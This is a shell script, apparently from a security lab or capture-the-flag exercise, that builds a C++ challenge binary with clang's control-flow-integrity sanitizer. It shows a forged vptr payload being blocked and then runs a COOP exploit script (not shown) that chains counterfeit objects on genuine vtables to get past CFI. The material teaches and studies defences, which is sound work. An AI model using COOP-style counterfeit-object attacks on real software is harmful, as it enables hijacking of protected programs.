set -u
cd "$(dirname "$0")"

line() { printf '\n\033[1;36m=== %s ===\033[0m\n' "$1"; }

line "0. Build (clang++ with -fsanitize=cfi)"
make --no-print-directory

line "1. FORGED/garbage object: aim a counterfeit vptr at junk -> CFI BLOCKS it"
echo '(cfi-vcall verifies the vptr is a genuine vtable of the hierarchy;'
echo ' garbage is rejected as "invalid vtable")'
python3 - <<'PY' 2>&1 | sed 's/^/   /'
import subprocess, struct
inp = b"\x01" + struct.pack("<Q", 0x4390f8)
r = subprocess.run(["./challenge"], input=inp, capture_output=True)
out = r.stdout + r.stderr
print("CFI trap fired? ->", b"control flow integrity" in out)
for l in out.split(b"\n"):
    if b"control flow integrity" in l or b"invalid vtable" in l:
        print(l.decode(errors="replace").strip())
PY

line "2. COOP: forge two counterfeit objects on REAL vtables -> CFI ALLOWS it"
echo '(Unlock/Reveal vtables are genuine vtables of the Greeter hierarchy, so'
echo ' every virtual call passes cfi-vcall; the loop chains them in order)'
python3 exploit.py 2>&1 | sed 's/^/   /'
